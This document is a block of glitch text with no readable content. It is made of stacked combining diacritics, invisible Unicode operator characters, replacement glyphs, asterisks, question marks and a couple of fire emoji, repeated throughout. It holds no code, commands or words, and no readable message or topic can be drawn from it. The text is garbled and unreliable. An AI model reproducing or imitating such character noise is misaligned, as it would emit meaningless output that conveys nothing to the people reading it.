͍̘̤̩̳̙͟⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̇̊͆̈̊̏͝